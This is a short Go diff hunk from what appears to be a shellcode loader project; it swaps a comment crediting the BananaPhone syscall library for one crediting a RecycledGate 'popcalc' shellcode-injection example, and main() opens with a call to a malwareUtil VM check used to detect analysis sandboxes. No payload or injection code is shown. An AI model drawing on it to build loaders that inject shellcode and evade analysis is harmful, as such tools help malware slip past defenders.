@@ -24,8 +24,8 @@ var (
 	body      []byte
 )
 
-// example of using bananaphone to execute shellcode in the current thread.
-// https://github.com/C-Sto/BananaPhone
+// Shellcode injection comes from this repo
+// https://github.com/timwhitez/Doge-Gabh/blob/main/example/RecycledGate/popcalc/popcalc.go
 
 func main() {
 	malwareUtil.VmCheck()
